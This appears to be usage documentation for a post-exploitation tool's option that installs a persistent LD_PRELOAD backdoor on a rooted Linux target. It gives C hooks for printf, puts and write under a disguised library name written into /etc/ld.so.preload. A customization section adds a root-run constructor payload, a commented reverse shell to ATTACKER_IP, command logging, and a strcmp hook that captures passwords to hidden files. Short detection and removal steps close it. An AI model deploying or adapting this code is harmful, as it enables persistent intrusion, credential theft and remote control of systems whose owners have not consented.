# Option 5: Install LD_PRELOAD Backdoor

## Overview

**Purpose:** Installs a shared library backdoor that hooks output functions to inject "[Hacked By George Yanni]" banner before every command's output, demonstrating system-wide code injection capabilities.

**How It Works:**
1. Creates a shared library (`libpam_systemd.so`) that hooks `printf()`, `puts()`, and `write()`
2. The library is installed to `/usr/local/lib/libpam_systemd.so` (permanent location)
3. The library loads into every process via `/etc/ld.so.preload`
3. Before any output, prints "[Hacked By George Yanni]" banner
4. Every executed command/program will display the banner before its output

---

## Step-by-Step Instructions

### Step 1: Run the Exploit and Gain Root Access

**Location:** Target machine

```bash
./comprehensive

# Wait for privilege escalation
# You should see: [INFO] Successfully gained root privileges!
```

### Step 2: Select Option 5 from the Menu

**Location:** Target machine

When the menu appears, select option 5:

```
╔══════════════════════════════════════════════════╗
║        POST-EXPLOITATION MENU                    ║
╚══════════════════════════════════════════════════╝

Available actions:
  ...
  5. Install LD_PRELOAD backdoor
  ...
  
Select option: 5
```

### Step 3: Verify Installation

**Location:** Target machine

You should see:
```
[INFO] Installing LD_PRELOAD backdoor
[INFO] LD_PRELOAD backdoor installed
```

### Step 4: Verify the Backdoor

**Location:** Target machine

```bash
# Check if library was created
ls -la /usr/local/lib/libpam_systemd.so

# Check if added to ld.so.preload
cat /etc/ld.so.preload
# Should show: /usr/local/lib/libpam_systemd.so

# Test by running any command
id
# You should see:
# [Hacked By George Yanni]
# uid=0(root) gid=0(root) groups=0(root)
```

---

## What Gets Installed

### Shared Library Created

**Location:** `/usr/local/lib/libpam_systemd.so`

**Source Location (temporary):** `/tmp/backdoor_source.c` (removed after compilation)

**Default Behavior:**
- Hooks output functions (`printf`, `puts`, `write`) using `dlsym(RTLD_NEXT)`
- Prints "[Hacked By George Yanni]" before first output of each command
- Only shows banner once per command execution
- Prevents recursion using static flags and environment variable checks

### Configuration File Modified

**Location:** `/etc/ld.so.preload`

**Content Added:**
```
/usr/local/lib/libpam_systemd.so
```

**What This Does:**
- Forces the shared library to load before any other libraries
- Affects ALL dynamically linked programs on the system
- Cannot be bypassed by normal users (requires root to modify `/etc/ld.so.preload`)

---

## How It Works

### LD_PRELOAD Mechanism

**`/etc/ld.so.preload`** is a system-wide configuration file that tells the dynamic linker to load specified shared libraries into every process before any other libraries.

**Process Flow:**
1. User executes any command (e.g., `ls`, `id`, `cat`)
2. Dynamic linker checks `/etc/ld.so.preload`
3. Loads `/usr/local/lib/libpam_systemd.so` into the process
4. Constructor function (`init()`) initializes flags
5. When program calls `printf()`, `puts()`, or `write()`, our hooked version intercepts
6. Banner is printed first (only once per command)
7. Original function is called via `dlsym(RTLD_NEXT)` to output normal content

### Function Hooking Mechanism

The backdoor hooks standard output functions using **LD_PRELOAD** and **`dlsym(RTLD_NEXT)`**:

```c
// Hook printf to inject banner
int printf(const char *format, ...) {
    int (*orig_vprintf)(const char *, va_list) = dlsym(RTLD_NEXT, "vprintf");
    print_banner();  // Print "[Hacked By George Yanni]" once
    // ... call original printf ...
}

// Hook puts
int puts(const char *s) {
    int (*orig_puts)(const char *) = dlsym(RTLD_NEXT, "puts");
    print_banner();  // Print banner once
    return orig_puts(s);
}

// Hook write (low-level)
ssize_t write(int fd, const void *buf, size_t count) {
    ssize_t (*orig_write)(int, const void *, size_t) = dlsym(RTLD_NEXT, "write");
    if (fd == STDOUT_FILENO || fd == STDERR_FILENO) {
        print_banner();  // Print banner once
    }
    return orig_write(fd, buf, count);
}
```

**Key Points:**
- `dlsym(RTLD_NEXT, "function_name")` gets the original function pointer
- Allows intercepting and modifying behavior before calling original
- Static flags prevent recursive printing (fork bomb protection)
- Only intercepts stdout/stderr, not all file descriptors

---

## Customization

### Modify the Backdoor Behavior

**Location:** Target machine (requires root)

**Step 1: Check current backdoor source**

The source is deleted after compilation, but you can view the compiled library or recreate it.

**Step 2: Create custom backdoor**

```bash
# Create custom backdoor source
cat > /tmp/custom_backdoor.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void __attribute__((constructor)) init(void) {
    if (getuid() == 0) {
        // Your custom payload here
        system("/bin/bash -c 'echo root_executed >> /tmp/.backdoor_log'");
        
        // Example: Reverse shell (uncomment to use)
        // system("/bin/bash -c 'sleep 5 && /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
    }
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/custom_backdoor.so /tmp/custom_backdoor.c -ldl

# Update ld.so.preload
echo '/tmp/custom_backdoor.so' > /etc/ld.so.preload

# Test
ls
cat /tmp/.backdoor_log
```

### Common Customizations

#### 1. Change Banner Message

```c
static void print_banner(void) {
    if (first_output) {
        first_output = 0;
        ssize_t (*orig_write)(int, const void *, size_t) = dlsym(RTLD_NEXT, "write");
        if (orig_write) {
            const char *banner = "\n[0XYANNI WAS HERE]\n";
            orig_write(STDOUT_FILENO, banner, strlen(banner));
        }
    }
}
```

#### 2. Conditional Banner (Only for Root)

```c
int printf(const char *format, ...) {
    int (*orig_vprintf)(const char *, va_list) = dlsym(RTLD_NEXT, "vprintf");
    if (!orig_vprintf) return 0;
    
    // Only show banner if running as root
    if (getuid() == 0) {
        print_banner();
    }
    
    va_list args;
    va_start(args, format);
    int ret = orig_vprintf(format, args);
    va_end(args);
    return ret;
}
```

#### 3. Log Commands with Banner

```c
int printf(const char *format, ...) {
    int (*orig_vprintf)(const char *, va_list) = dlsym(RTLD_NEXT, "vprintf");
    if (!orig_vprintf) return 0;
    
    // Log command being executed
    FILE *log = fopen("/tmp/.cmd_log", "a");
    if (log) {
        char cmdline[256] = {0};
        FILE *f = fopen("/proc/self/cmdline", "r");
        if (f) {
            fgets(cmdline, sizeof(cmdline), f);
            fclose(f);
        }
        fprintf(log, "[%ld] CMD: %s\n", time(NULL), cmdline);
        fclose(log);
    }
    
    print_banner();
    
    va_list args;
    va_start(args, format);
    int ret = orig_vprintf(format, args);
    va_end(args);
    return ret;
}
```

#### 4. Function Hooking

```c
// Hook strcmp to bypass password checks
int strcmp(const char *s1, const char *s2) {
    // Get original strcmp
    int (*original_strcmp)(const char *, const char *) = dlsym(RTLD_NEXT, "strcmp");
    
    // Log password attempts
    if (s1 && s2) {
        FILE *fp = fopen("/tmp/.passwords", "a");
        if (fp) {
            fprintf(fp, "strcmp: %s vs %s\n", s1, s2);
            fclose(fp);
        }
    }
    
    return original_strcmp(s1, s2);
}
```

## Limitations

1. **Root Required:** Installing to `/etc/ld.so.preload` requires root access
2. **Static Binaries:** Only affects dynamically linked programs (not statically compiled)
3. **Detection:** Can be detected by checking `/etc/ld.so.preload`
4. **File Location:** Installed to `/usr/local/lib/libpam_systemd.so` (permanent system location)
5. **Static Binaries:** Function hooks don't work on statically compiled programs
6. **Output Modification:** Visible banner may alert users to compromise

---

## Detection and Prevention

### How Administrators Can Detect

**1. Check ld.so.preload:**
```bash
cat /etc/ld.so.preload
ls -la /etc/ld.so.preload
```

**2. Check shared library:**
```bash
ls -la /usr/local/lib/libpam_systemd.so
file /usr/local/lib/libpam_systemd.so
strings /usr/local/lib/libpam_systemd.so
```

**3. Notice banner output:**
```bash
# Any command will show the banner
ls
id
whoami
# All should show "[Hacked By George Yanni]" before output
```

**4. Analyze library behavior:**
```bash
# Use strace to see library loading
strace -e trace=open,openat ls 2>&1 | grep backdoor

# Use ldd to check dependencies
ldd $(which ls) | grep backdoor
```


## Removing the Backdoor

### Manual Removal

```bash
# Remove from ld.so.preload
> /etc/ld.so.preload
# Or edit and remove the line:
# nano /etc/ld.so.preload

# Remove shared library
rm /usr/local/lib/libpam_systemd.so

# Verify removal by testing commands (banner should no longer appear)

# Verify removal
cat /etc/ld.so.preload
# Should be empty or not contain libpam_systemd.so
```

### Verify Removal

```bash
# Check ld.so.preload is clean
cat /etc/ld.so.preload

# Check library is gone
ls /usr/local/lib/libpam_systemd.so
# Should show: No such file or directory

# Test that backdoor no longer executes
ls
id
whoami
# Banner should NOT appear before output
```

